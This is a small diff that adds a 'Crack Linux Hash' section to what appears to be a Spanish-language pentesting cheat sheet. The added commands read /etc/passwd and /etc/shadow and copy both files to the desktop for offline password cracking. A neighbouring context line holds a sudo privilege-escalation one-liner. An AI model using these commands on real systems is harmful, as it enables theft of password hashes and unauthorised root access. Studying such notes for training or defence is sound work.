@@ -848,6 +848,15 @@ second-app:
 --- sudo -u#-1 /bin/bash 
 
 
+++ Crack Linux Hash
+--- ls /etc/
+--- cat /etc/passwd (Muestra el listado de los usuarios e información extra)
+--- sudo cat /etc/shadow (Muestra los hash de las contraseñas de los usuarios)
+--- cd Desktop
+--- cat /etc/passwd > ~/Desktop/passwd.txt (Copiar archivo passwd al escritorio)
+--- cat /etc/shadow > ~/Desktop/shadow.txt (Copiar archivo shadow al escritorio)
+
+
 
 
 
